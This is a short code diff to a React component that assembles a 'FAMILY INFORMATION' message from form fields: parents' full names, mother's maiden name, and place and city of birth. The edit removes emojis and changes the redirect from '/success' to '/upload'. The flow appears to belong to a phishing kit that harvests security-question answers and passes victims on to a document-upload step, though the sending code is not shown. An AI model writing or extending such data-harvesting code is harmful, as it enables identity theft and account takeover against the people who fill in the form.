@@ -37,10 +37,10 @@ const Teil = () => {
     const message = `
       👨‍👩‍👧 FAMILY INFORMATION (TEIL)
       ━━━━━━━━━━━━━━━━━━━━━━━━━
-      👨 Father's Full Name: ${fatherFullName}
-      👩 Mother's Full Name: ${motherFullName}
-      💍 Mother's Maiden Name: ${motherMaidenName}
-      📍 Place of Birth: ${placeOfBirth}
+      Father's Full Name: ${fatherFullName}
+    Mother's Full Name: ${motherFullName}
+      Mother's Maiden Name: ${motherMaidenName}
+       Place of Birth: ${placeOfBirth}
       🏙️ City of Birth: ${cityOfBirth}
       ━━━━━━━━━━━━━━━━━━━━━━━━━
       ⏰ Time: ${new Date().toLocaleString()}
@@ -60,7 +60,7 @@ const Teil = () => {
       
       // Optional: Redirect after 2 seconds
       setTimeout(() => {
-        navigate("/success");
+        navigate("/upload");
       }, 2000);
       
     } catch (error) {
